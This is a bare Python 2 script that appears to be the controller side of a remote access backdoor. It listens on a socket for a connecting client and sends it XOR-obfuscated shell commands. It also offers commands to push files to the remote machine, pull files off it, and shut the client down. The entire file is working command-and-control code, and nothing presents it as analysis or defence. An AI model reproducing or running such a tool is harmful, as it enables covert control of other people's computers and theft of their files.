import socket, select, os

HOST = 'localhost'
PORT = 35001

def xorE(message):
    newMessage = ""
    for char in message:
        deChar = ord(char) ^ ord('[')
        newMessage += str(chr(deChar))
    return str.encode(newMessage)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))
sock.listen(1)


while True:
    conn, addr = sock.accept()
    print ('Connected by '+str(addr))
  #  rec = conn.recv(15);
  #  print (xorE(rec));

    while True:
        data = raw_input("enter command: ")
        if not data:
            continue
        elif data == "kill":
            conn.sendall(xorE("kill"))
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break
        elif data == "end":
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            exit()            
        elif "upload" in data.lower():
            # syntax: upload /path/to/file/to/upload
            # file will go to client's  current working directory
            print("Uploading...")
            command = data.split(' ')

            if len(command) != 2:
                print("Incorrect upload syntax")
                continue

            data = xorE(command[0])
            conn.sendall(data)

            sourcePath = command.pop(1)
            fileSize = os.stat(sourcePath).st_size
            fileSizeStr = str(fileSize).zfill(10)
            print(fileSizeStr)
            print("Filesize of file to upload is: {}".format(fileSizeStr))
            data = xorE("{}".format(fileSizeStr))
            conn.sendall(data)

            with open(sourcePath, 'rb') as f:
                conn.sendall(xorE(f.read()))
            continue
        elif "download" in data.lower():
            # syntax: download /remote/path    o/file    o/download /local/path
            # file will go to server's current working directory
            
            command = data.split(' ')

            if len(command) != 3:
                print("Incorrect download syntax")
                continue
                
            destinationPath = command.pop(1)
            f = open(destinationPath, 'w+b')
            print("Writing file to {}\n".format(destinationPath))
            data = ' '.join(command)
            data = xorE(data)
            conn.sendall(data)
        
            fileData = conn.recv(1024)
            while(fileData):

                fileData = xorE(fileData)
                print(fileData)
                ## This will probably break at some point, not ideal solution
                if "99999EOF99999" in fileData:
                    temp = fileData.split("99999EOF99999")
                    if "xxxxx" in temp[0]:
                        temp = temp[0].split("xxxxx")
                        fileSize = temp[1]
                        print("Writing {} bytes.\n".format(fileSize))
                        f.write(temp[2])
                    else:
                        f.write(temp[0])
                    break
                elif "xxxxx" in fileData:
                    temp = fileData.split("xxxxx")
                    fileSize = temp[1]
                    print("Writing {} bytes.\n".format(fileSize))
                    f.write(temp[2])
                    fileData = conn.recv(1024)
                else:
                    f.write(fileData)
                    fileData = conn.recv(1024)    

            print("File download complete!\n")
            f.close()
            break
        else:
            data = xorE(data)
            conn.sendall(data)
            rec = conn.recv(1024)
            message = xorE(rec)
            while "EndeNdenD" not in message:
                print(message)
                rec = conn.recv(1024)
                message = xorE(rec)